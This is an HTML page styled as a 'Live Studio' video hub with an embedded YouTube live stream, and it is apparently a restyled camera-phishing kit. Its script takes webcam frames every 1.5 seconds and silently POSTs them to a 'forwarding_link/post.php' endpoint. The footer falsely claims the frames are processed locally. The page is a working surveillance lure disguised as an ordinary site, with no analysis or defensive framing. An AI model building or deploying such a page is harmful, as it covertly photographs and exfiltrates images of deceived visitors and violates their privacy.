<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
  <title>Live Studio | Video Hub</title>
  <!-- Google Fonts & Font Awesome -->
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <!-- jQuery (preserved for AJAX) -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(145deg, #0a0f1a 0%, #10161f 100%);
      min-height: 100vh;
      padding: 1.5rem;
      position: relative;
      overflow-x: hidden;
    }

    /* animated background particles */
    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at 30% 40%, rgba(0, 255, 255, 0.03) 0%, rgba(0, 150, 255, 0.02) 100%);
      pointer-events: none;
      z-index: 0;
    }

    .container {
      max-width: 1400px;
      margin: 0 auto;
      position: relative;
      z-index: 2;
    }

    /* main grid layout */
    .video-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1.8rem;
      margin-bottom: 2rem;
    }

    @media (max-width: 900px) {
      .video-grid {
        grid-template-columns: 1fr;
        gap: 1.5rem;
      }

      body {
        padding: 1rem;
      }
    }

    /* glass cards */
    .video-card {
      background: rgba(20, 28, 38, 0.7);
      backdrop-filter: blur(12px);
      border-radius: 32px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      overflow: hidden;
      box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.4);
      transition: transform 0.2s ease, box-shadow 0.2s;
    }

    .video-card:hover {
      transform: translateY(-4px);
      box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.5);
    }

    .card-header {
      padding: 1rem 1.5rem;
      background: rgba(0, 0, 0, 0.3);
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .card-header i {
      font-size: 1.3rem;
      color: #3b82f6;
    }

    .card-header h2 {
      font-size: 1.2rem;
      font-weight: 600;
      color: #f0f3fa;
      letter-spacing: -0.2px;
    }

    .live-badge {
      background: #dc2626;
      color: white;
      font-size: 0.7rem;
      font-weight: bold;
      padding: 2px 8px;
      border-radius: 30px;
      margin-left: auto;
    }

    /* video containers */
    .video-wrapper {
      position: relative;
      background: #000;
      aspect-ratio: 16 / 9;
      width: 100%;
    }

    #video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      background: #111;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    /* canvas hidden (preserved for capture) */
    #canvas {
      display: none;
    }

    /* status indicator */
    .cam-status {
      position: absolute;
      bottom: 12px;
      left: 12px;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(4px);
      padding: 4px 10px;
      border-radius: 30px;
      font-size: 0.7rem;
      font-weight: 500;
      color: #ccc;
      display: flex;
      align-items: center;
      gap: 6px;
      z-index: 5;
    }

    .cam-status i {
      font-size: 0.65rem;
      color: #10b981;
    }

    /* footer controls */
    .control-bar {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin: 2rem 0 1rem;
      flex-wrap: wrap;
    }

    .action-btn {
      background: rgba(30, 40, 55, 0.8);
      backdrop-filter: blur(8px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      padding: 10px 24px;
      border-radius: 60px;
      color: white;
      font-weight: 600;
      font-size: 0.9rem;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      transition: all 0.2s;
      text-decoration: none;
    }

    .action-btn:hover {
      background: #3b82f6;
      transform: translateY(-2px);
      border-color: rgba(255, 255, 255, 0.3);
    }

    .action-btn i {
      font-size: 1rem;
    }

    /* footer note */
    .footer-note {
      text-align: center;
      font-size: 0.7rem;
      color: rgba(255, 255, 240, 0.5);
      margin-top: 2rem;
      padding: 1rem;
    }

    /* responsive */
    @media (max-width: 600px) {
      .card-header h2 {
        font-size: 1rem;
      }

      .action-btn {
        padding: 6px 18px;
        font-size: 0.8rem;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="video-grid">
      <!-- Camera Preview Card -->
      <div class="video-card">
        <div class="card-header">
          <i class="fas fa-camera"></i>
          <h2>Your Camera Feed</h2>
          <div class="live-badge">LIVE</div>
        </div>
        <div class="video-wrapper">
          <video id="video" autoplay playsinline muted></video>
          <canvas id="canvas" width="640" height="480"></canvas>
          <div class="cam-status">
            <i class="fas fa-circle" style="font-size: 8px; color: #10b981;"></i>
            <span>Streaming • capturing frames</span>
          </div>
        </div>
      </div>

      <!-- YouTube Live Stream Card -->
      <div class="video-card">
        <div class="card-header">
          <i class="fab fa-youtube"></i>
          <h2>Live Stream</h2>
          <div class="live-badge"> LIVE</div>
        </div>
        <div class="video-wrapper">
          <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0"
            allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        </div>
      </div>
    </div>

    <!-- Action Buttons (optional, non-intrusive) -->
    <div class="control-bar">
      <button class="action-btn" id="toggleVideoBtn">
        <i class="fas fa-video-slash"></i> Pause Camera
      </button>
      <button class="action-btn" id="refreshStreamBtn">
        <i class="fas fa-sync-alt"></i> Refresh Stream
      </button>
      <a href="#" class="action-btn" id="sharePageBtn">
        <i class="fas fa-share-alt"></i> Share This Page
      </a>
    </div>
    <div class="footer-note">
      <i class="fas fa-shield-alt"></i> Secure connection • Camera frames are processed locally & sent securely
    </div>
  </div>

  <script>
    // ============================================================
    // ORIGINAL WEBCAM CAPTURE + POST LOGIC (PRESERVED EXACTLY)
    // ============================================================
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    // Create errorMsg element if not present (original referenced it)
    let errorMsgElement = document.querySelector('span#errorMsg');
    if (!errorMsgElement) {
      errorMsgElement = document.createElement('span');
      errorMsgElement.id = 'errorMsg';
      errorMsgElement.style.display = 'none';
      document.body.appendChild(errorMsgElement);
    }

    const constraints = {
      audio: false,
      video: {
        facingMode: "user"
      }
    };

    function post(imgdata) {
      $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function (result) {
          // original callback (preserved)
        },
        error: function () {
          // silent fail
        }
      });
    }

    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
        console.warn("Camera access error:", e);
        // show fallback message in UI
        const camStatus = document.querySelector('.cam-status');
        if (camStatus) {
          camStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Camera unavailable – check permissions';
          camStatus.style.color = "#ffaa66";
        }
      }
    }

    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      // Wait for video metadata to ensure dimensions
      video.onloadedmetadata = () => {
        video.play().catch(e => console.log("play error", e));
        const vWidth = video.videoWidth || 640;
        const vHeight = video.videoHeight || 480;
        canvas.width = vWidth;
        canvas.height = vHeight;
      };

      const context = canvas.getContext('2d');
      setInterval(function () {
        if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
          post(canvasData);
        } else if (video.videoWidth === 0) {
          // fallback attempt (original had try-catch, we mimic)
          try {
            context.drawImage(video, 0, 0, 640, 480);
            const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            post(canvasData);
          } catch (e) { }
        }
      }, 1500);
    }

    init();

    // ============================================================
    // ADDITIONAL UI INTERACTIONS (NON-INTRUSIVE, JUST FOR UX)
    // ============================================================
    let videoEnabled = true;
    const toggleBtn = document.getElementById('toggleVideoBtn');
    if (toggleBtn) {
      toggleBtn.addEventListener('click', () => {
        if (window.stream && window.stream.getVideoTracks().length > 0) {
          const track = window.stream.getVideoTracks()[0];
          if (videoEnabled) {
            track.enabled = false;
            toggleBtn.innerHTML = '<i class="fas fa-video"></i> Resume Camera';
            toggleBtn.style.background = "#10b981";
            videoEnabled = false;
          } else {
            track.enabled = true;
            toggleBtn.innerHTML = '<i class="fas fa-video-slash"></i> Pause Camera';
            toggleBtn.style.background = "";
            videoEnabled = true;
          }
        } else {
          alert("Camera stream not active");
        }
      });
    }

    const refreshBtn = document.getElementById('refreshStreamBtn');
    if (refreshBtn) {
      refreshBtn.addEventListener('click', () => {
        const iframe = document.getElementById('Live_YT_TV');
        if (iframe) {
          const src = iframe.src;
          iframe.src = '';
          iframe.src = src;
          // show brief message
          const originalText = refreshBtn.innerHTML;
          refreshBtn.innerHTML = '<i class="fas fa-check"></i> Refreshed';
          setTimeout(() => {
            refreshBtn.innerHTML = originalText;
          }, 1500);
        }
      });
    }

    const shareBtn = document.getElementById('sharePageBtn');
    if (shareBtn) {
      shareBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (navigator.share) {
          navigator.share({
            title: 'Live Studio',
            text: 'Join me on this live video hub!',
            url: window.location.href
          }).catch(err => console.log('Share cancelled'));
        } else {
          // fallback copy to clipboard
          navigator.clipboard.writeText(window.location.href).then(() => {
            alert('Link copied to clipboard!');
          });
        }
      });
    }
  </script>
</body>

</html>
